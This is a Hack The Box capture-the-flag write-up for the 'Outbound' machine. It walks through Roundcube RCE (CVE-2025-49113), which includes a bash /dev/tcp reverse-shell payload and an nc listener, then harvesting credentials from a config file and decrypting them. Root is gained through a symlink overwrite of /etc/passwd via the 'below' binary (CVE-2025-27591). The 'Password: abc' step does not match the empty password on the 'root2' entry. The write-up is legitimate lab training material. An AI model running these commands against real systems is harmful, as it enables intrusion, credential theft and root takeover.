# 🚪 Hack The Box – Outbound (Easy)

**Machine IPAddress**: `10.10.11.77`
**Solved by**: Akshat Nigam 
**Difficulty**: Easy
**Category**: Linux | Web | Privilege Escalation
**Date**: July 2025

---

## 🕵️ Step 1: Finding Open Services (Enumeration)

### 🔎 Nmap Scan

I started by scanning the target to see which ports were open and what services were running:

```bash
nmap -sV -sC 10.10.11.77 -v
```
This scan showed me two open ports:

* **22** – SSH (for remote login)
* **80** – HTTP (web server using nginx)

When I visited `http://10.10.11.77`, it redirected to a domain: `mail.outbound.htb`. To access it properly, I added it to my `/etc/hosts` file:

```bash
echo "10.10.11.77 mail.outbound.htb" | sudo tee -a /etc/hosts
```

---

## 🔐 Step 2: Finding a Way In (Exploitation)

### 🔍 Checking for Known Vulnerabilities

I used a tool called **Nuclei** to scan the website for known vulnerabilities:

```bash
nuclei -u http://mail.outbound.htb -tags cves
```
You have to manually update the templates for the nuclei tool. As this tool is a great vulnerability scanner developed by ProjectDiscovery and allows templates written in YAML to detect known vulnerabilities, misconfigurations, CVEs, and exposures in targets like web applications, APIs, and servers.

This flagged a **critical vulnerability**:

> 🔥 `CVE-2025-49113` – Roundcube Webmail Remote Code Execution

---

### 💣 Exploiting the Roundcube Vulnerability

I found a public exploit online and used it to get a shell:

```bash
git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit
cd CVE-2025-49113-exploit
python3 exploit.py -u http://mail.outbound.htb -e "bash -i >& /dev/tcp/<my-ip>/<port> 0>&1"
```

This gave me a low-privilege shell (basic access to the system).

To make the shell more stable, I used:

```bash
rlwrap nc -lvnp <port>
```



To gain fully interactive TTYs during reverse shells and to bypass restricted shells: 

```bash
script -q /dev/null

```
---

## 🧠 Step 3: Finding Credentials

I checked the Roundcube configuration file and found database credentials:

```
/var/www/html/config/config.inc.php
```

```php
$rcmail_config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

I logged into the database and looked at the session table. It had encrypted secrets stored using **Triple-DES (3DES)**.

Using the key from the config file:

```
rcmail-!24ByteDESkey*Str
```

…I was able to decrypt the session and recover user login credentials!

---

## 🔐 Step 4: SSH Login as Jacob

Using the recovered credentials, I logged in as `jacob` via SSH:

```bash
ssh jacob@10.10.11.77
```

Now I had a proper user shell on the machine.

---

## 🚀 Step 5: Privilege Escalation to Root

### 🔍 Checking Sudo Permissions

I ran:

```bash
sudo -l
```

…and found that I could run the binary `/usr/bin/below` as root **without a password**!

```bash
(ALL) NOPASSWD: /usr/bin/below *
```

But some arguments were blocked.

---

### 📛 Exploiting CVE-2025-27591 – Arbitrary File Write

The `below` binary had a known vulnerability that allowed **arbitrary file writes using symlinks**.

#### 🧪 Exploitation Steps:

1. Create a fake root user entry:

```bash
echo 'root2::0:0:root:/root:/bin/bash' > /tmp/payload
```

2. Point the log file to `/etc/passwd` using a symbolic link:

```bash
rm /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
```

3. Run the vulnerable binary:

```bash
sudo /usr/bin/below
```

4. In the binary interface, paste the contents of `/tmp/payload`. This writes a new root user entry into `/etc/passwd`.

5. Switch to the new root user:

```bash
su root2
Password: abc
```

🎉 Got root!

---

## 📌 Summary

| Phase            | Technique                                       |
| ---------------- | ----------------------------------------------- |
| Enumeration      | Nmap, Nuclei, manual recon                      |
| Initial Foothold | Roundcube RCE (CVE-2025-49113)                  |
| Credentials      | Config file → MySQL → Session → 3DES Decryption |
| Lateral Movement | SSH into user "jacob"                           |
| Privilege Escal. | CVE-2025-27591 using "below" binary             |

---

## ✅ Flags

* `user.txt` – Found as `jacob`
* `root.txt` – Found after root access

---


Thanks for reading! 🎯
